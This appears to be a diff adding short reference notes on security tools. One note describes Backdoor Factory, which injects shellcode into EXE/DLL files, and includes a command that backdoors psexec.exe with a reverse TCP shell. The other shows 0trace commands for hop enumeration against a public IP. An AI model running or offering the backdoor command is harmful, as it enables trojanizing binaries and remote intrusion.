@@ -1,0 +1,6 @@
+BDF: backdoor Factory 可以在EXE/DLL中对二进制文件进行shellcode注入，并继续正常执行 ./backdoor.py -f psexec.exe -H 127.0.0.1 -P 8080 -s reverse_shell_tcp
+0trace: This tool enables the user to perform hop enumeration ("traceroute") within an established TCP connection, such as a HTTP or SMTP session. 
+    Example:
+        Open a TCP connection - telnet 66.135.192.87 80
+        Start 0trace.py - ./0trace.py eth0 66.135.192.87 80
+        Initiate some TCP activity in telnet session - GET / HTTP/1.0
